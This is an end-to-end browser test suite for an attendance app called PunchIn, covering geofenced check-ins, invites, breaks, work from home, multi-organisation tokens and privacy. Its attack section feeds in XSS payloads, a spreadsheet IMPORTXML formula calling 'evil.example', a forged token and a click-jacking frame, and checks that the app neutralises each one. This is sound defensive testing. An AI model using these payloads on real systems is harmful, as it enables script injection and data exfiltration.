// END-TO-END, tester style: the real built app in Chrome, talking to the real gas/Code.js
// (Google's address is intercepted and answered by the server code running locally).
// Covers basic flows → admin flows → attacks via the URL and inputs → location edge cases → privacy.
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { createServer, type Server } from 'node:http';
import { readFileSync, existsSync } from 'node:fs';
import { join, extname } from 'node:path';
import { chromium, type Browser, type BrowserContext, type Page } from 'playwright-core';
import { loadGas } from '../gas/shim';

const g = loadGas();
const API = 'https://script.google.com/macros/s/TEST_DEPLOYMENT/exec', APP = 'http://127.0.0.1:4190/';
const OFFICE = { lat: 19.1136, lng: 72.8697 };
const north = (m: number) => ({ latitude: OFFICE.lat + m / 111195, longitude: OFFICE.lng });   // m metres due north
const TYPES: Record<string, string> = { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.svg': 'image/svg+xml', '.png': 'image/png', '.json': 'application/json', '.webmanifest': 'application/manifest+json' };
let web: Server, browser: Browser;
const hosts = new Set<string>();
const dialogs: string[] = [];

async function newPhone(opts: { geo?: { latitude: number; longitude: number; accuracy?: number }; allowGeo?: boolean } = {}): Promise<{ ctx: BrowserContext; page: Page }> {
  const ctx = await browser.newContext({ viewport: { width: 390, height: 844 }, isMobile: true, hasTouch: true, serviceWorkers: 'block',
    geolocation: opts.geo ? { ...opts.geo, accuracy: opts.geo.accuracy ?? 10 } : undefined, permissions: opts.allowGeo ? ['geolocation'] : [] });
  await ctx.addInitScript(() => { try {
    for (const k of Object.keys(localStorage)) if (k.startsWith('punchin.tour')) localStorage.removeItem(k);
    (window as any).__geoCalls = 0; (window as any).__mediaCalls = 0;
    const g0 = navigator.geolocation.getCurrentPosition.bind(navigator.geolocation);
    navigator.geolocation.getCurrentPosition = (...a: any[]) => { (window as any).__geoCalls++; return (g0 as any)(...a); };
    if (navigator.mediaDevices) navigator.mediaDevices.getUserMedia = async () => { (window as any).__mediaCalls++; throw new Error('blocked'); };
    localStorage.setItem('punchin.location.explained', '1');
  } catch { /* about:blank */ } });
  await ctx.route(/tile\.openstreetmap\.org/, r => r.fulfill({ status: 404 }));
  await ctx.route(API, async route => {
    const res = g.ctx.doPost({ postData: { contents: route.request().postData() ?? '' } }).text;
    await route.fulfill({ status: 200, contentType: 'application/json', headers: { 'Access-Control-Allow-Origin': '*' }, body: res });
  });
  const page = await ctx.newPage();
  page.on('request', r => hosts.add(new URL(r.url()).host));
  page.on('dialog', d => { dialogs.push(d.message()); d.dismiss(); });
  page.on('pageerror', e => { throw e; });
  return { ctx, page };
}
const skipTour = async (p: Page) => { const b = p.getByRole('button', { name: 'Skip tour' }); if (await b.count()) await b.click(); };

beforeAll(async () => {
  if (!existsSync('dist/index.html')) throw new Error('run npm run build first');
  g.setNowLocal('2026-11-19 09:12'); g.ctx.setup();
  web = createServer((req, res) => {
    const u = (req.url ?? '/').split('?')[0];
    if (u === '/config.json') { res.writeHead(200, { 'Content-Type': 'application/json' }); return res.end(JSON.stringify({ appsScriptUrl: API })); }
    const path = join('dist', u.endsWith('/') ? u + 'index.html' : u);
    if (!existsSync(path)) { res.writeHead(404); return res.end(); }
    res.writeHead(200, { 'Content-Type': TYPES[extname(path)] ?? 'application/octet-stream' }); res.end(readFileSync(path));
  });
  await new Promise<void>(r => web.listen(4190, '127.0.0.1', () => r()));
  browser = await chromium.launch({ executablePath: process.env.CHROME ?? '/usr/bin/google-chrome' });
}, 60_000);
afterAll(async () => { await browser?.close(); web?.close(); });

let empCode = '', page: Page, ctx: BrowserContext;

describe('1. Basic: manager becomes admin, invites Hitesh', () => {
  beforeAll(async () => ({ ctx, page } = await newPhone()));
  it('manager uses the one-time set-up code', async () => {
    await page.goto(APP);
    await page.getByRole('button', { name: /First time or forgot/ }).click();
    await page.getByLabel('Office email').fill('manager@dot9games.com'); await page.getByLabel('Code from your admin').fill(g.props.get('SETUP_CODE')!);
    await page.getByLabel('New password').fill('manager-pass-1'); await page.getByLabel('Repeat password').fill('manager-pass-1');
    await page.getByRole('button', { name: 'Save password & sign in' }).click();
    await page.getByText('Team today').waitFor({ timeout: 10000 });
  });
  it('admin tour starts by itself and shows the set-up checklist', async () => {
    await page.getByRole('dialog', { name: /Tour step 1/ }).waitFor({ timeout: 5000 });
    expect(await page.getByText('Your set-up checklist').count()).toBe(1);
    await skipTour(page);
    expect(await page.getByText('Get PunchIn ready').count()).toBe(1);
  });
  it('admin invites an employee and gets a WhatsApp invite link', async () => {
    await page.goto(APP + '#/admin/people');
    await page.getByRole('button', { name: 'Add person' }).click();
    await page.getByLabel('Office email').fill('hiteshdubey@dot9games.com'); await page.getByLabel('Nickname').fill('Hitesh');
    await page.getByRole('dialog').getByRole('button', { name: 'Add person' }).click();
    empCode = ((await page.locator('.modal .display').textContent({ timeout: 10000 })) ?? '').trim();
    expect(empCode).toMatch(/^[A-Z2-9]{8}$/);
    const href = await page.getByRole('link', { name: 'Send on WhatsApp' }).getAttribute('href');
    expect(decodeURIComponent(href!)).toContain(`#/join?e=hiteshdubey%40dot9games.com&c=${empCode}`);
  });
  it('admin sets the office on the map and turns on the location check', async () => {
    g.call('save_settings', { settings: { office_lat: OFFICE.lat, office_lng: OFFICE.lng, geofence_enabled: true, geofence_radius_m: 150, max_gps_accuracy_m: 100 } },
      await page.evaluate(() => localStorage.getItem('punchin.token')) as string);
    await ctx.close();
  });
});

describe('2. Basic: employee joins from the WhatsApp link', () => {
  beforeAll(async () => ({ ctx, page } = await newPhone({ geo: north(60), allowGeo: true })));
  it('link fills email and code; wrong code is refused clearly', async () => {
    await page.goto(`${APP}#/join?e=hiteshdubey%40dot9games.com&c=WRONGCDE`);
    expect(await page.getByLabel('Office email').inputValue()).toBe('hiteshdubey@dot9games.com');
    await page.getByLabel('New password').fill('hitesh-pass-1'); await page.getByLabel('Repeat password').fill('hitesh-pass-1');
    await page.getByRole('button', { name: 'Save password & sign in' }).click();
    expect(await page.getByRole('alert').textContent({ timeout: 10000 })).toMatch(/code do not match/);
  });
  it('correct link signs in and shows how to install the app', async () => {
    await page.goto(`${APP}#/join?e=hiteshdubey%40dot9games.com&c=${empCode}`);
    await page.getByLabel('New password').fill('hitesh-pass-1'); await page.getByLabel('Repeat password').fill('hitesh-pass-1');
    await page.getByRole('button', { name: 'Save password & sign in' }).click();
    await page.getByText('Now add PunchIn to your phone').waitFor({ timeout: 10000 });
  });
  it('employee tour runs on first open', async () => {
    await page.goto(APP + '#/today');
    await page.getByRole('dialog', { name: /Tour step 1 .*Check in and out/ }).waitFor({ timeout: 6000 });
    await skipTour(page);
  });
  it('location is NOT read just by opening the app', async () => {
    expect(await page.evaluate(() => (window as any).__geoCalls)).toBe(0);
  });
  it('check-in 60 m from the office works; time comes from the server', async () => {
    await page.getByRole('button', { name: /Check in/ }).click();
    await page.getByRole('button', { name: /Check out/ }).waitFor({ timeout: 10000 });
    expect(await page.locator('.dial-meta').textContent()).toContain('9:12 AM');
    expect(await page.evaluate(() => (window as any).__geoCalls)).toBe(1);
  });
});

describe('3. Location edge cases (map circle 150 m)', () => {
  const where = async (geo: ReturnType<typeof north> & { accuracy?: number }) => {
    await ctx.setGeolocation({ ...geo, accuracy: geo.accuracy ?? 10 });
    await page.getByRole('button', { name: /Am I inside/ }).click();
    await page.waitForTimeout(400);
    return (await page.locator('.geo-status').textContent()) ?? '';
  };
  it('149 m → inside', async () => { expect(await where(north(149))).toMatch(/inside — 149 m/); });
  it('152 m → outside, with the distance', async () => { expect(await where(north(152))).toMatch(/152 m away/); });
  it('2 km → outside', async () => { expect(await where(north(2000))).toMatch(/2000 m away/); });
  it('vague GPS (±400 m) → told to move near a window', async () => { expect(await where({ ...north(10), accuracy: 400 })).toMatch(/too vague/); });
  it('check-out from 2 km away is refused by the server and logged for the admin', async () => {
    await ctx.setGeolocation({ ...north(2000), accuracy: 10 });
    await page.getByRole('button', { name: /Check out/ }).click();
    expect(await page.getByRole('alert').textContent({ timeout: 10000 })).toMatch(/2000 m from the office/);
    expect(g.tab('Refused punches').data.length).toBe(2);
  });
  it('location permission denied → clear message, no punch', async () => {
    await ctx.clearPermissions();
    await page.getByRole('button', { name: /Check out/ }).click();
    expect(await page.getByRole('alert').textContent({ timeout: 10000 })).toMatch(/permission is off/i);
  });
});

describe('4. Attacks through the URL and inputs', () => {
  it('employee typing admin URLs is sent back to their own screen', async () => {
    for (const u of ['#/admin', '#/admin/people', '#/admin/settings', '#/admin/security', '#/announce?date=2026-11-25', '#/more']) {
      await page.goto(APP + u); await page.waitForTimeout(500);
      expect(page.url(), u).toMatch(/#\/today$/);
    }
  });
  it('admin endpoints refuse an employee token even when called directly', async () => {
    const r = await page.evaluate(async api => (await fetch(api, { method: 'POST', body: JSON.stringify({ fn: 'team_day', token: localStorage.getItem('punchin.token') }) })).json(), API);
    expect(r).toEqual({ ok: false, error: 'NOT_ALLOWED: admin only' });
  });
  it('a forged or stale token signs you out instead of showing data', async () => {
    await page.evaluate(() => localStorage.setItem('punchin.token', 'forged-0000'));
    await page.goto(APP + '#/today'); await page.reload();
    await page.getByRole('heading', { name: /Sign in|Can’t reach/ }).waitFor({ timeout: 10000 });
    expect(await page.evaluate(() => localStorage.getItem('punchin.token'))).toBeNull();
  });
  it('script injected through the join link is shown as text, never run', async () => {
    await page.goto(`${APP}#/join?e=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E&c=%3Cscript%3Ealert(2)%3C/script%3E`);
    await page.waitForTimeout(600);
    expect(await page.getByLabel('Code from your admin').inputValue()).toBe('SCRIPTALERT2');   // letters and digits only, max 12
    expect(dialogs).toEqual([]);
  });
  it('a nickname containing HTML is displayed as plain text', async () => {
    const admin = g.call('sign_in', { email: 'manager@dot9games.com', password: 'manager-pass-1' }).token;
    const m = g.call('admin_add_member', { p_email: 'x@dot9games.com', p_nickname: '<img src=x onerror=alert(3)>' }, admin);
    expect(m.nickname).toBe('<img src=x onerror=alert(3)>');
    await page.evaluate(t => localStorage.setItem('punchin.token', t), admin);
    await page.goto(APP + '#/admin/people'); await page.reload(); await skipTour(page);
    await page.getByText('<img src=x onerror=alert(3)>').waitFor({ timeout: 10000 });
    expect(dialogs).toEqual([]);
  });
  it('spreadsheet formulas typed as text stay text in the sheet', () => {
    const admin = g.call('sign_in', { email: 'manager@dot9games.com', password: 'manager-pass-1' }).token;
    g.call('add_holiday', { date: '2026-12-01', name: '=IMPORTXML("https://evil.example","//a")' }, admin);
    const row = g.tab('Holidays').data.find(r => r[1] === '2026-12-01')!;
    expect(row[2]).toBe('=IMPORTXML("https://evil.example","//a")');    // the tab is text-formatted: Sheets never runs it
  });
  it('the app refuses to run inside someone else’s frame (click-jacking)', async () => {
    const p2 = await ctx.newPage();
    await p2.setContent(`<iframe src="${APP}" width="400" height="600"></iframe>`);
    const f = p2.frames()[1]; await f.waitForLoadState();
    await f.getByText(/can’t be opened inside another website/).waitFor({ timeout: 10000 });
    await p2.close();
  });
});

describe('6. v2.1: breaks, simpler History, work from home, a second organisation', () => {
  let p6: Page, c6: BrowserContext;
  beforeAll(async () => ({ ctx: c6, page: p6 } = await newPhone({ geo: north(40), allowGeo: true })));
  afterAll(async () => { await c6?.close(); });
  it('sign-in screen names the office you are signing in to', async () => {
    const admin = g.call('sign_in', { email: 'manager@dot9games.com', password: 'manager-pass-1' }).token;
    g.call('save_settings', { settings: { company_name: 'Dot9 Games' } }, admin);
    await p6.goto(APP);
    await p6.locator('.org-chip', { hasText: 'Dot9 Games' }).waitFor({ timeout: 10000 });
    await p6.getByLabel('Office email').fill('hiteshdubey@dot9games.com'); await p6.getByLabel('Password').fill('hitesh-pass-1');
    await p6.getByRole('button', { name: 'Sign in' }).click();
    await p6.getByRole('button', { name: /Check out/ }).waitFor({ timeout: 10000 });
    await p6.getByRole('button', { name: 'Skip tour' }).click({ timeout: 5000 });
  });
  it('a new joiner is not shown as absent for days before they joined', async () => {
    await p6.locator('.bottomnav a', { hasText: 'History' }).click();
    await p6.getByText('Show weekends & holidays').waitFor();
    await p6.waitForTimeout(800);
    expect(await p6.locator('.list .item').count()).toBe(1);        // only 19 Nov, the joining day
    await p6.locator('.bottomnav a', { hasText: 'Today' }).click();
  });
  it('bottom bar is Today · History · Leave · Me (fixes live inside History)', async () => {
    expect(await p6.locator('.bottomnav a').allTextContents()).toEqual(['Today', 'History', 'Leave', 'Me']);
  });
  it('check out for lunch, check in again: the break is not counted', async () => {
    g.setNowLocal('2026-11-19 13:00');
    await p6.getByRole('button', { name: /Check out/ }).click();
    await p6.getByRole('button', { name: /Back after a break/ }).waitFor({ timeout: 10000 });
    g.setNowLocal('2026-11-19 13:45');
    await p6.getByRole('button', { name: /Back after a break/ }).click();
    await p6.getByRole('button', { name: /Check out/ }).waitFor({ timeout: 10000 });
    expect(await p6.locator('.dial-card').textContent()).toMatch(/45m break not counted/);
  });
  it('History has a Fix button on wrong days and a form for any day', async () => {
    await p6.locator('.bottomnav a', { hasText: 'History' }).click();
    await p6.getByRole('button', { name: /Ask for a fix/ }).click();
    await p6.getByRole('dialog', { name: /Ask for a fix/ }).waitFor({ timeout: 5000 });
    await p6.getByRole('button', { name: 'Cancel' }).click();
    await p6.goto(APP + '#/fixes?date=2026-11-18');                 // old links from reminders still work
    expect(await p6.getByLabel('Date').inputValue({ timeout: 5000 })).toBe('2026-11-18');
  });
  it('outside the office with WFH allowed: one tap to check in as working from home', async () => {
    const admin = g.call('sign_in', { email: 'manager@dot9games.com', password: 'manager-pass-1' }).token;
    g.call('save_settings', { settings: { allow_wfh: true } }, admin);
    g.setNowLocal('2026-11-20 09:20');
    await c6.setGeolocation({ ...north(5000), accuracy: 10 });
    await p6.goto(APP + '#/today'); await p6.reload();
    await p6.getByRole('button', { name: /^Check in/ }).click();
    await p6.getByRole('button', { name: 'Check in as working from home' }).click();
    await p6.getByText('Working from home today').waitFor({ timeout: 10000 });
    expect(g.tab('Attendance').data.filter(r => r.includes('2026-11-20')).length).toBe(1);
  });
  it('a second organisation uses the same app with its own sheet; tokens never cross over', async () => {
    const g2 = loadGas(); g2.setNowLocal('2026-11-20 09:00'); g2.ctx.setup();
    const t2 = g2.call('sign_up', { email: 'owner@bakery.in', code: g2.props.get('SETUP_CODE'), password: 'bakery-pass-1' }).token;
    g2.call('save_settings', { settings: { company_name: 'Sunrise Bakery' } }, t2);
    const ORG = 'AKfycbSecondOrgDeploymentId123456789';
    const sent: string[] = [];
    await c6.route(`https://script.google.com/macros/s/${ORG}/exec`, async route => {
      sent.push(route.request().postData() ?? '');
      await route.fulfill({ status: 200, contentType: 'application/json', body: g2.ctx.doPost({ postData: { contents: route.request().postData() ?? '' } }).text });
    });
    await p6.goto(APP + `?org=${ORG}#/`);
    await p6.locator('.org-chip', { hasText: 'Sunrise Bakery' }).waitFor({ timeout: 10000 });
    expect(sent.every(b => JSON.parse(b).token === null)).toBe(true);     // Dot9 token was never sent to the bakery
    await p6.getByLabel('Office email').fill('owner@bakery.in'); await p6.getByLabel('Password').fill('bakery-pass-1');
    await p6.getByRole('button', { name: 'Sign in' }).click();
    await p6.getByText('Team today').waitFor({ timeout: 10000 });
    const link = await p6.evaluate(() => (window as any).__punchinInvite ?? null);
    expect(link).toBeNull();
    expect(await p6.evaluate(() => Object.keys(localStorage).filter(k => k.startsWith('punchin.token')).sort())).toEqual(['punchin.token', `punchin.token.${'AKfycbSecondOrgDeploymentId123456789'}`]);
  });
});

describe('5. Privacy', () => {
  it('no camera or microphone was ever requested', async () => {
    expect(await page.evaluate(() => (window as any).__mediaCalls)).toBe(0);
    const manifest = readFileSync('dist/manifest.webmanifest', 'utf8');
    expect(manifest).not.toMatch(/permissions|camera|microphone/i);
  });
  it('the page only talks to the app itself, Google (server), Google Fonts and map tiles', () => {
    const allowed = ['127.0.0.1:4190', 'script.google.com', 'fonts.googleapis.com', 'fonts.gstatic.com', 'tile.openstreetmap.org'];
    expect([...hosts].filter(h => !allowed.includes(h))).toEqual([]);
  });
  it('a strict Content-Security-Policy is shipped', () => {
    const html = readFileSync('dist/index.html', 'utf8');
    expect(html).toMatch(/script-src 'self';/); expect(html).toMatch(/object-src 'none'/); expect(html).toMatch(/frame-src 'none'/);
  });
  it('exact GPS positions never reached the sheet', () => {
    const all = g.ss.getSheets().map(s => JSON.stringify(s.data)).join('');
    expect(all).not.toMatch(/19\.11[0-9]{3,}|72\.869[0-9]{2,}/);
  });
  it('privacy page is readable before signing in', async () => {
    await page.evaluate(() => { localStorage.removeItem('punchin.token'); localStorage.removeItem('punchin.org'); });
    await page.goto(APP + '#/privacy');
    await page.getByText(/exact coordinates are never stored/).waitFor({ timeout: 5000 });
    await ctx.close();
  });
});
